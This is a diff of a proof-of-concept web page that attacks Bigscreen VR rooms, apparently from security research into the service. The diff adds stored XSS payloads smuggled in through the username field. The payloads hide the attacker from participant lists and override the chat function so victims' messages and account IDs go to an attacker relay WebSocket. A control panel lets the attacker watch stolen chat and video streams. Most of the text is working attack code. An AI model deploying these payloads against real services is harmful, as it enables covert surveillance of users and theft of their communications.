@@ -6,6 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="./bootstrap.min.css">
+    <link rel="stylesheet" href="./main.css">
 
     <title>Man-in-the-Room Attack Proof of Concept - Bigscreen</title>
 </head>
@@ -15,19 +16,23 @@
         <div class="col-sm">
             <h1>Man-in-the-Room Attack <small class="text-muted">Proof of Concept</small></h1>
             <h2>Bigscreen <small class="text-muted"><a href="https://bigscreenvr.com/">https://bigscreenvr.com/</a></small></h2>
-            <form class="form-inline">
+            <div class="alert alert-success" role="alert">
+                Attacker's username is hidden from <i>Room Preview UI</i> and from <i>Room Participants UI</i>. Attacker is not visible in VR room.
+            </div>
+            <form class="form-inline" id="joinRoomForm">
                 <label class="mb-2 mr-sm-2" for="roomIdInput">Room ID: </label>
-                <div class="input-group mb-2 mr-sm-2">
-                  <div class="input-group-prepend">
-                    <span class="input-group-text">room-</span>
-                  </div>
-                  <input id="roomIdInput" type="text" class="form-control" placeholder="8we1jdc4">
-                </div>
-                <button id="joinRoomButton" type="button" class="btn btn-outline-primary mb-2 mr-sm-2">Join</button>
+                <input class="mb-2 mr-sm-2 form-control" id="roomIdInput" type="text" placeholder="8we1jdc4" required>
+                <input class="btn btn-outline-primary mb-2 mr-sm-2" type="submit" value="Eavesdrop">
             </form>
         </div>
     </div>
-    <div id="users" class="row"></div>
+
+
+
+
+<div id="rooms"></div>
+
+
 </div>
 <!-- Optional JavaScript -->
 <!-- jQuery first, then Popper.js, then Bootstrap JS -->
@@ -60,6 +65,8 @@ let connections = [];
 let allRemoteStreams = [];
 let roomState;
 
+let rooms = {};
+
 let turnReady;
 
 let dataChannelSend, dataChannelReceive;
@@ -70,34 +77,47 @@ const pcConfig = {
     }]
 };
 
-<!--region variables for Bigscreen signaling protocol-->
+
 let textName = '__Mallory__';
-let NAME = textName + '<scr' + 'ipt>Array.prototype.forEach.call(document.querySelectorAll("#room-participants li"), function(e){if(e.querySelector("h3.user-name").firstChild.nodeValue === "'+textName+'"){e.remove()}});</sc'+'ript>';
+
+let relayServer = 'ws://172.26.103.128:8081'; // TODO
+//region XSS payloads
+let hideUsernameFromRoomPreview = `Array.prototype.forEach.call(document.getElementById('room-card-players').childNodes,function(e,i,a){if(e.nodeName==='#text' && e.data==='${textName}'){if(i!==0){a[i-1].remove();}}e.remove();});`;
+let hideFirstCommaFromRoomPreview = "setTimeout(function(){var n=document.getElementById('room-card-players').childNodes;if(n[0].nodeName==='SCRIPT'&&n[1].nodeName==='#text'&& n[1].data===', '){n[1].remove()}},1);";
+let hideUsernameFromRoomParticipants = `Array.prototype.forEach.call(document.querySelectorAll('#room-participants li'),function(e){if(e.querySelector('h3.user-name').firstChild.nodeValue==='${textName}'){e.remove()}});`;
+let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayServer}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
+//endregion
+
+//region variables for Bigscreen signaling protocol
+let NAME = textName;
+NAME += '<scr'+'ipt>';
+NAME += hideUsernameFromRoomPreview;
+NAME += hideFirstCommaFromRoomPreview;
+NAME += hideUsernameFromRoomParticipants;
+NAME += persistentChatEavesdropping;
+NAME += '</sc'+'ript>';
+
 let roomId;
 let myUserId;
 let myUuid = generateBigscreenUuid();
 let unityVersion = '0.34.0';
 let mySteamId = '';
 let myOculusId = '';
-
-
-
-<!--endregion-->
+//endregion
 
 const bigscreenSignalUrl = 'wss://signal2.bigscreenvr.com';
 let websocket;
 
 
 <!--region GUI bindings -->
-const joinRoomButton = document.getElementById('joinRoomButton');
-const usersSectionElement = document.getElementById('users');
+const joinRoomForm = document.getElementById('joinRoomForm');
+const roomsElement = document.getElementById('rooms');
 const roomIdInput = document.getElementById('roomIdInput');
 <!--endregion-->
 
-joinRoomButton.addEventListener("click", function () {
-    roomId = 'room-' + roomIdInput.value;
-    roomIdInput.readOnly = true;
-    joinRoomButton.disabled = true;
+joinRoomForm.addEventListener("submit", function (event) {
+    event.preventDefault();
+    roomId = roomIdInput.value;
 
     websocket = new WebSocket(bigscreenSignalUrl);
     websocket.binaryType = 'arraybuffer';
@@ -106,6 +126,9 @@ joinRoomButton.addEventListener("click", function () {
         sendMessage({type: 'register-desktop'});
         console.log('registered');
         joinRoom();
+        let roomUI = new RoomCardUI(roomId);
+        roomUI.render(roomsElement);
+        rooms[roomId] = roomUI;
     };
     websocket.onclose = function (event) {
         console.log('onClose disconnected', event);
@@ -117,6 +140,58 @@ joinRoomButton.addEventListener("click", function () {
         console.log('onError event', event);
     };
 });
+
+function RoomCardUI(roomId){
+    let roomCardTempalte = document.createElement('template');
+    roomCardTempalte.innerHTML =
+        '<div class="card">\n' +
+        '    <div class="card-header"></div>\n' +
+        '    <div class="card-body">\n' +
+        '        <div class="row">\n' +
+        '            <div class="col-sm-3">\n' +
+        '                <div class="card">\n' +
+        '                    <div class="card-header">Chat</div>\n' +
+        '                    <div class="card-body chat">\n' +
+        '                    </div>\n' +
+        '                </div>\n' +
+        '            </div>\n' +
+        '            <div class="col-sm-9">\n' +
+        '                <div class="row"></div>\n' +
+        '            </div>\n' +
+        '      </div>\n' +
+        '  </div>\n' +
+        '</div>';
+    this.roomCardElement = roomCardTempalte.content.firstChild;
+
+    this.roomIdElement = this.roomCardElement.querySelector('.card-header');
+    this.roomIdElement.appendChild(document.createTextNode(roomId));
+
+    this.chatBodyElement = this.roomCardElement.querySelector('div div div div div.card-body');
+    this.participantsElement = this.roomCardElement.querySelector('div div div div.row');
+
+    this.render = function(parentElement){
+        parentElement.appendChild(this.roomCardElement);
+    };
+
+    this.renderChatMessage = function(message, sender, date){
+        let chatMessageTemplate = document.createElement('template');
+        chatMessageTemplate.innerHTML =
+            '<blockquote class="blockquote">\n' +
+            '    <p class="mb-0"></p>\n' +
+            '    <footer class="blockquote-footer"><cite title="Sender"></cite></footer>\n' +
+            '</blockquote>\n';
+        let chatMessageElement = chatMessageTemplate.content.firstChild;
+        chatMessageElement.querySelector('p').appendChild(document.createTextNode(message));
+        chatMessageElement.querySelector('footer cite').appendChild(document.createTextNode(sender));
+        chatMessageElement.querySelector('footer').appendChild(document.createTextNode(' at '+date));
+        this.chatBodyElement.appendChild(chatMessageElement);
+
+        this.chatBodyElement.scrollTop = this.chatBodyElement.scrollHeight;
+    }
+}
+
+
+
 
 ////////////////////////////////////////////////
 
@@ -272,11 +347,7 @@ function sendUserReady(){
 }
 ////////////////////////////////////////////////////
 
-if (location.hostname !== 'localhost') {
-    requestTurn(
-        'https://computeengineondemand.appspot.com/turn?username=41784574&key=4080218913'
-    );
-}
+
 
 function maybeStart(connection) {
     if (!connection.isStarted) {
@@ -309,7 +380,7 @@ function maybeStart(connection) {
                 if(connection.pcid === 0){
                     if(connection.videoElement === null){
                         let template = document.createElement('template');
-                        template.innerHTML = '<div class="col-sm-3">\n' +
+                        template.innerHTML = '<div class="col-sm-4">\n' +
                             '           <div class="card">\n' +
                             '               <video class="card-img-top" autoplay playsinline controls></video>\n' +
                             '              <div class="card-body">\n' +
@@ -322,7 +393,7 @@ function maybeStart(connection) {
                         let cardElement = template.content.firstChild;
                         connection.cardElement = cardElement;
                         connection.videoElement = cardElement.getElementsByTagName('video')[0];
-                        usersSectionElement.appendChild(cardElement);
+                        rooms[roomId].participantsElement.appendChild(cardElement);
                         showUsernames();
                     }
                     connection.videoElement.srcObject = event.streams[0];
@@ -412,6 +483,13 @@ function onCreateSessionDescriptionError(error) {
     console.log('Failed to create session description: ' + error.toString());
 }
 
+/*
+if (location.hostname !== 'localhost') {
+    requestTurn(
+        'https://computeengineondemand.appspot.com/turn?username=41784574&key=4080218913'
+    );
+}
+
 function requestTurn(turnURL) {
     let turnExists = false;
     for (let i in pcConfig.iceServers) {
@@ -440,6 +518,20 @@ function requestTurn(turnURL) {
         xhr.send();
     }
 }
+*/
+
+
+
+let lastReceivedMessage;
+var messageRelayWs = new WebSocket('ws://127.0.0.1:8081');
+messageRelayWs.onopen = function(){
+    messageRelayWs.send('control-panel-connect');
+};
+messageRelayWs.onmessage = function(event){
+    let message = JSON.parse(event.data);
+    console.log("messageRelayWs received:", message);
+    rooms[message.roomId].renderChatMessage(message.message, message.name, new Date());
+};
 
 </script>
 </body>
